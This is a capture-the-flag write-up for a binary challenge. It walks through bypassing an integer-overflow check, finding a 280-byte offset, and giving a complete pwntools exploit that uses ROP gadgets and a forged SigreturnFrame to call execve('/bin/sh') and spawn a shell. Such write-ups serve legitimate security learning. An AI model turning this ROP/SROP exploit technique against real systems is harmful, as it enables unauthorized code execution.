<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/img1.png"/>
So, the program asks for a number. On reversing the binary, we can see that a buffer overflow will occur if the user inputs a certain number

```
if(local_11c + 1 < local_11c){
  vulnerable_code...
}


```
Since, local_11c  is a uint, we can enter the max value i.e 4294967295. It will make the if condition true and thus, you can enter into the vulnerable code
After that, by using gdb, we can easily find the offset to rip which is 280. 
<br>
Now, the further plan is pretty straight forward. We will create a ROP chain to spawn a shell. Usually, this is done by calling system("/bin/sh"). In this case, the binary does not contain the function system. So, we cannot use this method. But, we can use execve("/bin/sh",0,0) . Since, this is a statically linked binary, it contains lots of ROP gadgets which would make exploit development easier. 
<br>
The binary also does not contain the string "/bin/sh". But, we can write this string into some writeable section such as the heap in this case. Now, I will write the exploit step by step.  First of all we need to find ROPgadgets. Tools like ROPgadget or Ropper can be used for it.

```
from pwn import *
elf = context.binary = ELF("./week3_chall2")
p = elf.process()

# Specify the architecture because it is needed to create a fake Sigreturn Frame
context.arch = "amd64"

movGadget = 0x0000000000543650 #mov qword ptr [rcx], rdx ; ret
pop_rcx_ret =  0x0000000000460133 # pop rcx ; ret
pop_rdx_ret = 0x000000000040421f # pop rdx ; ret
pop_rax_ret = 0x000000000041d24a # pop rax ; ret
ret = 0x000000000040101a #ret;
syscall = 0x00000000004039c9 # syscall;
heap = 0x00000000005dd000

offset = 280 #The offset to rip
binsh = 0x0068732f6e69622f #/bin/sh\x00
junk = b'a'*offset
p.recvuntil("Enter a number: ")
p.sendline('4294967295')
p.recvuntil("Whats Your Name, My Fellow h4x0r: ")

#The payload to write /bin/sh\x00 into memory
payload = junk + flat(pop_rcx_ret,heap,pop_rdx_ret,binsh,movGadget) 
```
After that, we need to call execve("/bin/sh\0",0,0). This can be easily done using syscalls.
Creating a fake SigreturnFrame

```
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = heap
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall
```

Now, we have created a Sigreturn frame. This would be used to set everything in order to call execve("/bin/sh\0",0,0). Refer to https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ for more details on the Linux syscall table.

Now, make a sys_rt_sigreturn syscall which would be used to execute the Sigreturn Frame created by us. popping 0xf into the rax register followed by a syscall and our sigreturn frame would spawn a shell
```
payload += flat(pop_rax_ret,0xf,syscall,frame)
p.sendline(payload)
p.interactive()
```

### PROOF
<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/img2.png"/>
